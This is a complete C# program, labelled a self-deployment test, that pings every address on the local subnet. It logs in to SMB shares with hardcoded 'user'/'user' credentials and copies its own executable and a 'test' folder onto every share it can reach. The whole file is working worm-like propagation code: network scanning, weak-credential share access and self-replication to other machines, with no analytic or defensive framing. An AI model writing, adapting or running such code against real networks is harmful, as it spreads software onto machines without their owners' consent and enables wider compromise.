using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    // SMB login parameters
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";

    static async Task Main()
    {
        Console.WriteLine("Starting IP Range, SMB Scan, and Self-Deployment Test...");
        Console.WriteLine("-----------------------------------");

        string localIP = GetLocalIPAddress();
        if (localIP == null)
        {
            Console.WriteLine("[ERROR] Could not detect local IP address.");
            return;
        }

        string baseIP = string.Join(".", localIP.Split('.').Take(3));
        Console.WriteLine($"Local IP Address detected: {localIP}");
        Console.WriteLine($"Scanning network: {baseIP}.1 - {baseIP}.254 for active SMB servers...");

        List<string> smbHosts = await FindSmbServersAsync(baseIP);

        if (smbHosts.Count == 0)
        {
            Console.WriteLine("[INFO] No SMB servers found. Exiting.");
            return;
        }

        Console.WriteLine($"[INFO] Found {smbHosts.Count} SMB host(s) with accessible shares.");

        // Only now prepare deployment package
        string tempFolder = Path.Combine(Path.GetTempPath(), $"IpScannerDeployment_{Guid.NewGuid():N}");
        Console.WriteLine($"Preparing deployment package in temporary folder: {tempFolder}");
        PrepareDeploymentPackage(tempFolder);

        foreach (string ip in smbHosts)
        {
            string remoteShare = $"\\\\{ip}\\{SMB_SHARE_NAME}";
            Console.WriteLine($"Attempting SMB login on {remoteShare}...");

            int result = ConnectToRemoteShare(remoteShare, SMB_USERNAME, SMB_PASSWORD);
            if (result == 0)
            {
                Console.WriteLine($"[SMB SUCCESS] Connected to {ip}. Copying deployment files...");
                await CopyFolderAsync(tempFolder, remoteShare);
                Console.WriteLine($"[COPY OK] Files copied to {remoteShare}");
                DisconnectFromRemoteShare(remoteShare);
            }
            else
            {
                Console.WriteLine($"[SMB FAILED] {ip} - Error Code: {result}");
            }
        }

        Console.WriteLine("-----------------------------------");
        Console.WriteLine("Scan and deployment complete.");
        Console.WriteLine($"[CLEANUP] Deleting temporary directory: {tempFolder}");
        Directory.Delete(tempFolder, true);

        Console.WriteLine("Press any key to exit.");
        Console.ReadKey();
    }

    // ----------------------------- Helper Methods -----------------------------

    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
    {
        var activeHosts = new List<string>();
        var pingTasks = new List<Task>();

        var semaphore = new SemaphoreSlim(50);
        for (int i = 1; i <= 254; i++)
        {
            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync();

            pingTasks.Add(Task.Run(async () =>
            {
                try
                {
                    var ping = new Ping();
                    var reply = await ping.SendPingAsync(ip, 300);
                    if (reply.Status == IPStatus.Success)
                    {
                        // Try connecting to SMB share quickly to verify SMB service
                        string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
                        int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);
                        if (result == 0)
                        {
                            Console.WriteLine($"[ACTIVE SMB] {ip} - Share '{SMB_SHARE_NAME}' accessible");
                            activeHosts.Add(ip);
                            DisconnectFromRemoteShare(smbPath);
                        }
                        else
                        {
                            Console.WriteLine($"[ACTIVE] {ip} - No SMB share or invalid credentials");
                        }
                    }
                }
                catch { /* ignore ping exceptions */ }
                finally { semaphore.Release(); }
            }));
        }

        await Task.WhenAll(pingTasks);
        return activeHosts;
    }

    private static void PrepareDeploymentPackage(string tempFolder)
    {
        Directory.CreateDirectory(tempFolder);

        string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        File.Copy(exePath, Path.Combine(tempFolder, Path.GetFileName(exePath)), overwrite: true);

        string testFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test");
        if (Directory.Exists(testFolder))
        {
            CopyFolderSync(testFolder, Path.Combine(tempFolder, "test"));
        }
        else
        {
            Console.WriteLine("WARNING: 'test' folder not found, skipping copy.");
        }

        Console.WriteLine("Deployment package prepared successfully.");
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
            File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);

        foreach (string dir in Directory.GetDirectories(source))
            CopyFolderSync(dir, Path.Combine(dest, Path.GetFileName(dir)));
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
            await Task.Run(() => File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));

        foreach (string dir in Directory.GetDirectories(source))
            await CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir)));
    }

    private static string GetLocalIPAddress()
    {
        var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
        return host.AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
    }

    // ----------------------------- SMB API Calls -----------------------------

    [DllImport("mpr.dll")]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll")]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE
        {
            dwType = 1, // RESOURCETYPE_DISK
            lpRemoteName = remotePath
        };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        WNetCancelConnection2(remotePath, 0, true);
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct NETRESOURCE
    {
        public int dwScope;
        public int dwType;
        public int dwDisplayType;
        public int dwUsage;
        public string lpLocalName;
        public string lpRemoteName;
        public string lpComment;
        public string lpProvider;
    }
}
